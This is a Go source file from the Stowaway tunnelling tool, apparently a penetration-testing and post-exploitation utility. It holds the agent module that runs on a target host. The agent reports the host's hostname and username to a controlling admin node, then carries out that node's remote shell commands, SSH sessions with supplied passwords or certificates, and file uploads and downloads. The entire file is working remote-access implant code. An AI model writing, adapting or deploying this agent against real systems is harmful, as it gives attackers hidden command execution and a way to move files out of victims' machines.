/*
 * @Author: ph4ntom
 * @Date: 2021-03-10 15:27:30
 * @LastEditors: ph4ntom
 * @LastEditTime: 2021-03-22 20:05:37
 */

package process

import (
	"Stowaway/agent/handler"
	"Stowaway/agent/initial"
	"Stowaway/crypto"
	"Stowaway/protocol"
	"Stowaway/share"
	"Stowaway/utils"
	"log"
	"net"
)

type Agent struct {
	UUID         string
	Conn         net.Conn
	Memo         string
	CryptoSecret []byte
	UserOptions  *initial.Options
}

func NewAgent(options *initial.Options) *Agent {
	agent := new(Agent)
	agent.UUID = protocol.TEMP_UUID
	agent.CryptoSecret, _ = crypto.KeyPadding([]byte(options.Secret))
	agent.UserOptions = options
	return agent
}

func (agent *Agent) Run() {
	agent.sendMyInfo()
	agent.handleDataFromUpstream()
	//agent.handleDataFromDownstream()
}

func (agent *Agent) sendMyInfo() {
	sMessage := protocol.PrepareAndDecideWhichSProto(agent.Conn, agent.UserOptions.Secret, agent.UUID)
	header := protocol.Header{
		Sender:      agent.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.MYINFO,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	hostname, username := utils.GetSystemInfo()

	myInfoMess := protocol.MyInfo{
		UsernameLen: uint64(len(username)),
		Username:    username,
		HostnameLen: uint64(len(hostname)),
		Hostname:    hostname,
	}

	protocol.ConstructMessage(sMessage, header, myInfoMess)
	sMessage.SendMessage()
}

func (agent *Agent) handleDataFromUpstream() {
	rMessage := protocol.PrepareAndDecideWhichRProto(agent.Conn, agent.UserOptions.Secret, agent.UUID)
	//sMessage := protocol.PrepareAndDecideWhichSProto(agent.Conn, agent.UserOptions.Secret, agent.ID)
	component := &protocol.MessageComponent{
		Secret: agent.UserOptions.Secret,
		Conn:   agent.Conn,
		UUID:   agent.UUID,
	}

	shell := handler.NewShell()
	mySSH := handler.NewSSH()
	file := share.NewFile()

	for {
		fHeader, fMessage, err := protocol.DestructMessage(rMessage)
		if err != nil {
			log.Println("[*]Peer node seems offline!")
			break
		}
		if fHeader.Accepter == agent.UUID {
			switch fHeader.MessageType {
			case protocol.MYMEMO:
				message := fMessage.(*protocol.MyMemo)
				agent.Memo = message.Memo
			case protocol.SHELLREQ:
				// No need to check member "start"
				go shell.Start(component)
			case protocol.SHELLCOMMAND:
				message := fMessage.(*protocol.ShellCommand)
				shell.Input(message.Command)
			case protocol.LISTENREQ:
				//message := fMessage.(*protocol.ListenReq)
				//go handler.StartListen(message.Addr)
			case protocol.SSHREQ:
				message := fMessage.(*protocol.SSHReq)
				mySSH.Addr = message.Addr
				mySSH.Method = int(message.Method)
				mySSH.Username = message.Username
				mySSH.Password = message.Password
				mySSH.Certificate = message.Certificate
				go mySSH.Start(component)
			case protocol.SSHCOMMAND:
				message := fMessage.(*protocol.SSHCommand)
				mySSH.Input(message.Command)
			case protocol.FILESTATREQ:
				message := fMessage.(*protocol.FileStatReq)
				file.FileName = message.Filename
				file.SliceNum = message.SliceNum
				err := file.CheckFileStat(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID)
				if err == nil {
					go file.Receive(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
				}
			case protocol.FILESTATRES:
				message := fMessage.(*protocol.FileStatRes)
				if message.OK == 1 {
					go file.Upload(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
				} else {
					file.Handler.Close()
				}
			case protocol.FILEDATA:
				message := fMessage.(*protocol.FileData)
				file.DataChan <- message.Data
			case protocol.FILEERR:
				// No need to check message
				file.ErrChan <- true
			case protocol.FILEDOWNREQ:
				message := fMessage.(*protocol.FileDownReq)
				file.FilePath = message.FilePath
				file.FileName = message.Filename
				file.SendFileStat(component, protocol.TEMP_ROUTE, protocol.ADMIN_UUID, share.AGENT)
			default:
				log.Println("[*]Unknown Message!")
			}
		}
	}
}
